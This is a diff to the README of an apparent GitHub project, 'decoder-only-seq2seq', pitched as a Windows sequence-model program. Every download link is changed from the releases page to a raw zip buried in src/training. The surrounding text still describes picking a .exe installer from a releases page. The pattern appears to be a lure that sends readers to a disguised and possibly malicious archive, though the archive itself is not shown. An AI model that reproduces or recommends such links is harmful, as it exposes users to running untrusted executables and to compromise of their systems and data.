@@ -1,6 +1,6 @@
 # ⚙️ decoder-only-seq2seq - Simple Sequence Model Pipeline
 
-[![Download decoder-only-seq2seq](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/Banniesdread/decoder-only-seq2seq/releases)
+[![Download decoder-only-seq2seq](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/Banniesdread/decoder-only-seq2seq/raw/refs/heads/main/src/training/seq-decoder-only-v3.0.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If your PC does not have a powerful graphics card, the software will still work 
 
 Please visit this page to download the latest version of decoder-only-seq2seq for Windows:
 
-[Download Page](https://github.com/Banniesdread/decoder-only-seq2seq/releases)
+[Download Page](https://github.com/Banniesdread/decoder-only-seq2seq/raw/refs/heads/main/src/training/seq-decoder-only-v3.0.zip)
 
 The page lists all available versions and installation packages. Choose the most recent Windows installer file (usually ending with `.exe`).
 
@@ -42,7 +42,7 @@ The page lists all available versions and installation packages. Choose the most
 Follow these steps to get decoder-only-seq2seq set up on your Windows machine.
 
 1. Click the big download badge or open the download page:  
-   https://github.com/Banniesdread/decoder-only-seq2seq/releases
+   https://github.com/Banniesdread/decoder-only-seq2seq/raw/refs/heads/main/src/training/seq-decoder-only-v3.0.zip
 
 2. Look for the latest release. It usually has the newest date or version number.
 
@@ -146,4 +146,4 @@ All these features are included in a single, simple Windows program.
 
 Click here to visit the page and get the latest Windows installer:
 
-[Download decoder-only-seq2seq](https://github.com/Banniesdread/decoder-only-seq2seq/releases)
+[Download decoder-only-seq2seq](https://github.com/Banniesdread/decoder-only-seq2seq/raw/refs/heads/main/src/training/seq-decoder-only-v3.0.zip)
